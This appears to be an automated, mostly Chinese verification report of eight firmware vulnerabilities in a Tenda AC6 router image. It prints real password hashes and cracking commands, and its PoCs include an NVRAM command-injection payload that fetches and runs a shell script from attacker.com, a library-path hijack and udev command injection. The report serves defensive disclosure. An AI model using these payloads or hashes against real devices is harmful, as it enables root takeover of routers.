# _US_AC6V1.0BR_V15.03.05.16_multi_TD01.bin.extracted - 验证报告 (8 个发现)

---

## 原始信息

- **文件/目录路径：** `etc_ro/shadow`
- **位置：** `shadow:1`
- **描述：** shadow 文件具有全局读、写、执行权限（777），这是一个严重的安全配置错误，允许任何用户（包括非 root 用户）读取 root 用户的密码哈希。哈希使用弱 MD5 算法（$1$），易于受到离线暴力破解攻击。攻击者作为已登录非 root 用户，可以执行 'cat /etc/shadow' 或类似命令直接获取哈希值，然后使用工具如 John the Ripper 或 hashcat 进行破解。如果 root 密码强度低（例如，常见密码或短密码），攻击者可以在较短时间内破解并获得 root 权限。触发条件简单：攻击者只需拥有 shell 访问权限并执行读取命令。约束条件包括攻击者需要有效登录凭据，但作为非 root 用户，他们本不应访问 shadow 文件。潜在攻击包括权限提升到 root，从而完全控制设备。利用方式涉及标准密码破解技术，无需复杂交互。
- **代码片段：**
  ```
  root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  ```
- **备注：** 风险评分基于权限配置错误和弱哈希算法，但实际利用成功取决于密码强度；建议立即修复文件权限为 600 并强制使用强密码。后续分析可验证其他用户哈希或检查系统日志以评估破解尝试。关联文件可能包括 /etc/passwd，但本分析仅聚焦于 shadow 文件。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全准确：证据显示 'etc_ro/shadow' 文件权限为 777（任何用户可读），且内容包含 root 用户的弱 MD5 哈希（$1$）。攻击者模型为已登录非 root 用户（例如，通过默认凭据或其他漏洞获得 shell 访问）。可利用性验证：攻击者可控输入（直接文件读取）、路径可达（执行 'cat /etc/shadow' 命令）、实际影响（权限提升到 root）。完整攻击链：1) 攻击者以非 root 用户身份登录；2) 执行 'cat /etc/shadow' 获取哈希；3) 使用工具如 John the Ripper（命令：john --format=md5crypt hash.txt）或 hashcat（命令：hashcat -m 500 hash.txt wordlist）破解弱密码；4) 若密码强度低（如常见或短密码），破解成功并获得 root 权限。此漏洞风险高，因配置错误和弱算法结合，允许简单利用。

## 验证指标

- **验证时长：** 113.68 秒
- **Token 使用量：** 106050

---

## 原始信息

- **文件/目录路径：** `etc_ro/passwd`
- **位置：** `passwd:2-5`
- **描述：** passwd 文件中多个用户（admin、support、user、nobody）使用弱 DES 密码哈希，且所有用户具有 UID 0（root 权限）。非 root 攻击者可通过读取 /etc/passwd 文件获取哈希值，利用工具（如 john 或 hashcat）破解弱 DES 哈希，从而获得这些用户的密码。攻击者然后可通过 'su' 或 SSH 登录这些用户，由于 UID 0，立即获得 root 权限。触发条件：攻击者具有对 /etc/passwd 的读访问权且密码强度弱；利用方式：离线破解哈希后登录；边界检查：无密码强度强制或哈希升级。
- **代码片段：**
  ```
  admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh
  support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh
  user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh
  nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh
  ```
- **备注：** 假设攻击者具有 /etc/passwd 读访问权（通常为世界可读），且 DES 哈希易破解（使用传统 crypt 算法）。建议验证这些账户是否启用登录，并检查密码策略。关联文件：无其他文件直接涉及；后续可分析认证流程或 setuid 程序。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述准确：证据显示admin、support、user和nobody用户使用弱DES密码哈希（如admin:6HgsSsJIEOc2U）且UID为0。攻击者模型为非root攻击者具有对/etc/passwd的读访问权（通常世界可读）。漏洞真实可利用：攻击者可读取文件提取哈希，使用工具（如john或hashcat）离线破解弱DES哈希（DES易破解），获得密码后通过'su'或SSH登录这些用户，由于UID 0立即获得root权限。完整攻击链：1. 读取/etc/passwd（cat /etc/passwd）；2. 提取DES哈希（如admin:6HgsSsJIEOc2U）；3. 破解哈希（例如：john --format=descrypt hashes.txt）；4. 登录（su admin）并输入密码；5. 获得root权限。风险高，因导致权限提升。

## 验证指标

- **验证时长：** 126.23 秒
- **Token 使用量：** 120267

---

## 原始信息

- **文件/目录路径：** `etc_ro/ld.so.conf`
- **位置：** `文件: ld.so.conf`
- **描述：** 文件 'ld.so.conf' 具有全局可写权限（-rwxrwxrwx），允许任何用户（包括非 root 用户）修改动态链接器的库搜索路径。攻击者可以添加恶意库路径（如用户可控目录），导致库劫持攻击。触发条件：非 root 用户成功登录后，直接修改该文件并添加恶意路径；当系统或用户程序使用动态链接器运行时，会加载恶意库，执行任意代码。利用方式简单：攻击者只需写入恶意路径（例如 '/tmp/malicious_lib'），并确保恶意库存在且可执行，然后触发程序执行（如通过常见系统命令或服务）。缺少边界检查：文件没有权限限制，允许任意修改，且动态链接器默认信任配置路径。
- **代码片段：**
  ```
  /lib
  /usr/lib
  ```
- **备注：** 此发现基于文件权限和内容证据，攻击链完整且可验证。建议进一步分析系统程序是否普遍使用动态链接（例如通过 'ldd' 命令），并检查是否有其他防护机制（如 SELinux）可能缓解此风险。关联文件可能包括动态链接器二进制（如 '/lib/ld-linux.so'）和用户可控目录中的恶意库。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全基于证据：文件 'etc_ro/ld.so.conf' 权限为 -rwxrwxrwx（全局可写），内容为 '/lib\n/usr/lib'，与代码片段一致。攻击者模型为非 root 用户成功登录系统后（已通过身份验证的本地用户），可修改文件添加恶意库路径（如 /tmp）。动态链接器默认信任此配置，当程序（如常见系统命令）使用动态链接器运行时，会加载恶意库，导致任意代码执行。完整攻击链验证：1) 输入可控：非 root 用户可写文件；2) 路径可达：动态链接器在程序启动时读取文件，路径可触发；3) 实际影响：库劫持可导致权限提升或系统破坏。可重现 PoC：攻击者登录后执行：echo '/tmp' >> /etc/ld.so.conf；在 /tmp 中创建恶意库 libmalicious.so（包含恶意代码）；运行程序如 /bin/ls，触发库加载并执行代码。漏洞风险高，因利用简单且影响严重。

## 验证指标

- **验证时长：** 140.55 秒
- **Token 使用量：** 137086

---

## 原始信息

- **文件/目录路径：** `bin/cfmd`
- **位置：** `cfmd:0x0000adf4 (function fcn.0000adf4)`
- **描述：** The cfmd daemon contains a command injection vulnerability due to unsanitized use of user-controlled NVRAM variables in system command execution. Trigger conditions occur when cfmd initializes network configurations or processes specific settings, reading NVRAM values via GetCfmValue and passing them directly to doSystemCmd without validation. An authenticated attacker can exploit this by setting malicious values in NVRAM variables (e.g., through web interface), leading to arbitrary command execution with root privileges. The code uses fixed-size buffers (e.g., 24 bytes) for these values, but command injection is possible if doSystemCmd utilizes shell execution, allowing bypass of buffer limits via shell metacharacters. Multiple code paths in fcn.0000adf4 exhibit this pattern, with data flowing from NVRAM to dangerous operations.
- **代码片段：**
  ```
  // Example code from decompilation showing vulnerable pattern
  sym.imp.GetCfmValue(iVar6 + *0xb9a4, puVar7 + iVar4 + -0x70);
  uVar2 = sym.imp.strlen(puVar7 + iVar4 + -0x70);
  if (uVar2 < 7) {
      sym.imp.sprintf(puVar7 + iVar4 + -0x70, iVar6 + *0xb994, *(puVar7 + -8), *(puVar7 + -0xc));
  }
  uVar3 = sym.imp.get_eth_name(0);
  sym.imp.doSystemCmd(iVar6 + *0xb98c, uVar3, puVar7 + iVar4 + -0x70);
  ```
- **备注：** The vulnerability relies on doSystemCmd using shell execution (e.g., via system() call), which is plausible given the command templates observed in strings (e.g., 'ifconfig %s down'). Full exploitation requires the attacker to set NVRAM variables through another interface (e.g., web GUI), but this is consistent with the attack scenario. Further analysis should verify the implementation of doSystemCmd in shared libraries like libcommon.so. Additional unsafe functions (strcpy, sprintf) are present but not directly linked to exploitable chains in this analysis.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了cfmd中的命令注入漏洞。证据来自bin/cfmd的函数fcn.0000adf4的反汇编代码：
- GetCfmValue被调用读取NVRAM变量（如'wan1.macaddr'、'wan2.macaddr'、'lan.macaddr'等）到固定大小缓冲区（如var_70h，24字节）。
- 这些值直接传递给doSystemCmd执行系统命令（如'ifconfig %s hw ether %s'），没有输入清理或验证。
- 攻击者模型：经过身份验证的远程攻击者可以通过Web界面等设置NVRAM变量，控制输入。
- 路径可达：函数在cfmd初始化网络配置时被调用，代码路径在strlen检查后执行（长度大于6时）。
- 实际影响：doSystemCmd以root权限执行，允许任意命令执行。

PoC步骤：攻击者通过Web界面设置NVRAM变量（如wan1.macaddr）为恶意值：'aa; wget http://attacker.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh'。当cfmd重新初始化时，会执行命令'ifconfig eth0 hw ether aa; wget http://attacker.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh'，导致任意命令执行。漏洞风险高，因为无需物理访问，可远程利用，且影响严重。

## 验证指标

- **验证时长：** 175.97 秒
- **Token 使用量：** 194844

---

## 原始信息

- **文件/目录路径：** `sbin/udevd`
- **位置：** `文件:udevd 地址:0x0000a4e0 函数名:dbg.msg_queue_manager（入口） → 地址:0x0000a364 函数名:dbg.udev_event_run → 地址:0x00009ee8 函数名:dbg.udev_event_process → 地址:0x00013bb4 函数名:dbg.run_program（危险操作）。`
- **描述：** 不可信输入通过内部消息队列（IPC）传播，最终在 `dbg.run_program` 中执行命令，导致命令注入。攻击者可通过注入恶意队列元素（例如通过设备事件）来触发命令执行。触发条件是当精心构造的队列元素被处理时，绕过 `dbg.msg_queue_manager` 中的检查。潜在攻击方式包括注入命令数据，这些数据被格式化并执行而缺乏充分验证。相关代码逻辑：`dbg.msg_queue_manager` → `dbg.udev_event_run` → `dbg.udev_event_process` → `dbg.run_program`。
- **代码片段：**
  ```
  在 \`dbg.msg_queue_manager\` (0x0000a4e0): \`dbg.udev_event_run(ppiVar6);\`（队列元素处理）
  在 \`dbg.run_program\` (0x00013bb4): \`sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360);\`（命令执行）
  ```
- **备注：** 需要进一步追踪队列填充函数（如通过设备事件接口）以确认用户可访问性；建议分析 NVRAM、环境变量或 IPC 套接字作为潜在输入源。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The alert accurately describes the command injection vulnerability in 'sbin/udevd'. Evidence from the code analysis confirms the function chain: dbg.msg_queue_manager (0x0000a4e0) calls dbg.udev_event_run, which forks a process and calls dbg.udev_event_process (0x00009ee8). In dbg.udev_event_process, a command string from the message queue (via puVar7 + 2) is copied to a buffer, formatted with dbg.udev_rules_apply_format, and passed to dbg.run_program (0x00013bb4). dbg.run_program executes the command via sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360) without adequate validation. The input is controllable by attackers who can craft malicious udev events (e.g., through device addition/removal) that inject commands into the queue. The path is reachable as udevd processes events continuously, and the impact is arbitrary command execution with root privileges. PoC steps: 1) Attacker crafts a udev event message with a command string (e.g., '/bin/sh -c "malicious_command"') in the appropriate field (equivalent to puVar7 + 2). 2) The message is injected into the udev queue via device event interface (e.g., using tools like udevadm trigger or simulating USB events). 3) When processed, the command is executed by dbg.run_program, leading to code execution. This vulnerability is high risk due to the potential for root-level compromise.

## 验证指标

- **验证时长：** 247.98 秒
- **Token 使用量：** 326132

---

## 原始信息

- **文件/目录路径：** `lib/modules/url_filter.ko`
- **位置：** `url_filter.ko:0x08000b34 sym.define_url_filter_rule_seq_show`
- **描述：** 在 sym.define_url_filter_rule_seq_show 函数中，存在缓冲区溢出漏洞，由于内存分配和复制过程中的大小计算错误。具体表现：函数首先计算所需缓冲区大小（基于 URL 规则字符串的总长度加 1 每字符串），但随后在复制每个字符串时，额外复制了 4 字节硬编码数据（来自地址 0x08000c24）并递增缓冲区指针 1 字节，导致每字符串复制 strlen + 4 + 1 字节，而分配仅针对 strlen + 1 字节。触发条件：攻击者作为已登录用户（非 root）通过不可信输入（如 NVRAM 设置或 API 调用）控制 URL 过滤规则数据，使规则数量达到上限（约 1600 条），从而溢出内核缓冲区。完整攻击链：输入点（NVRAM/环境变量或 API）→ 数据流（全局变量和函数处理）→ 危险操作（内核内存损坏）。潜在攻击方式：内核内存损坏可能导致拒绝服务、信息泄露或代码执行，具体取决于溢出数据的控制和内存布局。
- **代码片段：**
  ```
  从反汇编代码：
  - 分配阶段：0x08000ad4: mov r0, r6  ; r6 为总长度（字符串长度和加 1 每字符串）
    0x08000ad8: movw r1, 0x8020  ; kmalloc 标志
    0x08000adc: bl __kmalloc  ; 分配缓冲区
  - 复制阶段：0x08000b08: ldr r1, [r5]  ; 加载字符串指针
    0x08000b14: bl strlen  ; 获取字符串长度
    0x08000b24: bl memcpy  ; 复制 strlen 字节到缓冲区
    0x08000b34: ldr r1, [0x08000c24]  ; 加载硬编码 4 字节数据
    0x08000b40: bl memcpy  ; 复制 4 字节到缓冲区
    0x08000b48: add r6, r6, 1  ; 缓冲区指针递增 1
  这表明每字符串复制了额外数据，超出分配大小。
  ```
- **备注：** 漏洞需要攻击者能操纵 URL 过滤规则数据，可能通过 NVRAM set 操作或前端 API。建议进一步分析数据输入点（如 NVRAM 处理函数）以确认完整攻击链。关联文件可能包括用户空间组件或配置接口。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 验证基于反汇编代码：分配阶段（0x08000ad4）使用 __kmalloc 分配缓冲区，大小基于 r6（每个字符串的 strlen + 1 字节总和）。复制阶段（0x08000b08-0x08000b50）每字符串复制 strlen 字节（字符串内容） + 4 字节（硬编码数据从 0x08000c24，值为 0x00000288） + 1 字节（指针递增），导致每字符串多复制 4 字节。循环限制（0x1900，即 6400 字节索引，对应约 1600 条规则）允许攻击者通过控制规则数据触发溢出。攻击者模型：已登录用户（非 root）通过不可信输入（如 NVRAM 设置或前端 API）配置 URL 过滤规则，使规则数量接近上限（1600 条），当系统读取规则显示（如通过 proc 文件系统接口）时，函数被调用，溢出内核缓冲区。完整攻击链：输入点（用户配置接口）→ 数据流（全局变量通过 sl 寄存器访问）→ 危险操作（memcpy 溢出）。PoC 步骤：攻击者作为已登录用户，通过 Web 界面或 CLI 添加约 1600 条 URL 过滤规则，每个规则字符串长度可控（例如，短字符串以最大化规则数量），然后触发规则显示操作（如执行 'cat /proc/url_filter' 或类似命令），导致内核内存损坏，可能造成拒绝服务或代码执行。漏洞风险高，因内核内存损坏可被利用提升权限或破坏系统稳定性。

## 验证指标

- **验证时长：** 255.09 秒
- **Token 使用量：** 335465

---

## 原始信息

- **文件/目录路径：** `sbin/udevd`
- **位置：** `文件:udevd 地址:0x0000a364 函数名:dbg.udev_event_run → 地址:0x00009ee8 函数名:dbg.udev_event_process → 地址:0x0000c09c 函数名:dbg.udev_device_event → 地址:0x00011184 函数名:dbg.udev_rules_get_name → 地址:0x00013868 函数名:dbg.unlink_secure → 地址:0x00009620 函数名:sym.imp.unlink（危险操作）。`
- **描述：** 不可信输入通过 udev 事件消息传播，最终在 `sym.imp.unlink` 中删除文件，导致任意文件删除漏洞。攻击者可通过控制事件数据指定删除路径。触发条件包括 udev 事件处理中涉及文件删除操作（如设备移除）。潜在攻击方式包括删除关键系统文件导致拒绝服务或权限提升。相关代码逻辑：`dbg.udev_event_run` → `dbg.udev_event_process` → `dbg.udev_device_event` → `dbg.udev_rules_get_name` → `dbg.unlink_secure` → `sym.imp.unlink`。
- **代码片段：**
  ```
  在 \`dbg.udev_event_process\` (0x00009ee8): \`dbg.strlcpy(piVar4 + 0x185, *(param_1 + 0x14), 0x100);\`（污点数据复制）
  在 \`dbg.unlink_secure\` (0x00013868): \`sym.imp.unlink(puVar16);\`（文件删除）
  ```
- **备注：** 攻击者需控制文件路径参数；建议检查 `dbg.unlink_secure` 中的路径过滤机制。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The security alert is verified based on code analysis. The call chain from udev event processing to unlink is confirmed: dbg.udev_event_process copies attacker-controlled input from event messages (via strlcpy at 0x00009fc4), which propagates through dbg.udev_device_event to dbg.udev_rules_get_name. In dbg.udev_rules_get_name, under conditions set by udev rules (e.g., when device structure field 0xb4c is non-zero), it calls dbg.unlink_secure with a path derived from the tainted input. dbg.unlink_secure then calls sym.imp.unlink to delete the file. Attackers can exploit this by crafting udev events with malicious paths, leading to arbitrary file deletion. This is exploitable by local attackers who can send udev events (e.g., via device hotplugging or spoofed events), potentially resulting in denial of service or privilege escalation if critical files are deleted. PoC: Craft a udev event with a controlled path in the event data (e.g., using udevadm trigger or direct socket communication) that matches rules triggering the deletion path in dbg.udev_rules_get_name.

## 验证指标

- **验证时长：** 290.03 秒
- **Token 使用量：** 380695

---

## 原始信息

- **文件/目录路径：** `sbin/udevd`
- **位置：** `文件:udevd 地址:0x0000a364 函数名:dbg.udev_event_run（入口） → 地址:0x00009ee8 函数名:dbg.udev_event_process → 地址:0x0000c09c 函数名:dbg.udev_device_event → 地址:0x00011184 函数名:dbg.udev_rules_get_name → 地址:0x0001036c 函数名:dbg.match_rule → 地址:0x00013bb4 函数名:dbg.run_program（危险操作）。`
- **描述：** 不可信输入通过 udev 事件消息（例如设备插入事件）传播，最终在 `dbg.run_program` 中执行命令，导致命令注入。攻击者可通过伪造事件数据（如设备路径或属性）注入恶意命令。触发条件包括 udev 事件触发（如设备插入），且输入数据未被充分验证。潜在攻击方式包括执行任意系统命令以提升权限或破坏系统。相关代码逻辑涉及函数调用链：`dbg.udev_event_run` → `dbg.udev_event_process` → `dbg.udev_device_event` → `dbg.udev_rules_get_name` → `dbg.match_rule` → `dbg.run_program`。
- **代码片段：**
  ```
  在 \`dbg.udev_event_process\` (0x00009ee8): \`dbg.strlcpy(piVar4 + 0x185, *(param_1 + 0x14), 0x100);\`（污点数据复制）
  在 \`dbg.run_program\` (0x00013bb4): \`sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360);\`（命令执行）
  ```
- **备注：** 输入点（udev 事件消息）可能通过 IPC 或网络接口由攻击者控制；建议验证事件消息的解析逻辑和访问控制。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The security alert is accurate based on code analysis. The function call chain demonstrates that untrusted input from udev event messages (e.g., device path or attributes) is copied in dbg.udev_event_process via `dbg.strlcpy(piVar4 + 0x185, *(param_1 + 0x14), 0x100)` and propagates to dbg.run_program, where it is executed via `sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360)`. Attackers can control this input by forging udev events (e.g., through USB device insertion, network interfaces, or IPC), and the path is reachable when udev rules are matched. No sufficient input sanitization is present, allowing command injection. PoC: An attacker could craft a udev event with a malicious device property (e.g., setting DEVPATH to ';/bin/sh' or using command substitution) to execute arbitrary commands as root, leading to full system compromise.

## 验证指标

- **验证时长：** 312.94 秒
- **Token 使用量：** 408443

---

